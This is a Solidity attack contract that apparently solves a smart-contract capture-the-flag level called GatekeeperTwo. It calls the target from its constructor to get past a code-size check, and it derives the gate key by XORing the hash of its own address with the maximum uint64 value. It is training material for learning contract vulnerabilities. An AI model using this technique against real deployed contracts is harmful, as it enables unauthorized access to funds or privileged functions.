// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntGateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperTwoAttack {
    IntGateKeeperTwo public gateKeeperTwo;

    constructor(address target) {
        gateKeeperTwo = IntGateKeeperTwo(target);
        callEnter();
    }

    function callEnter() public {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gateKeeperTwo.enter(gateKey);
    }

}
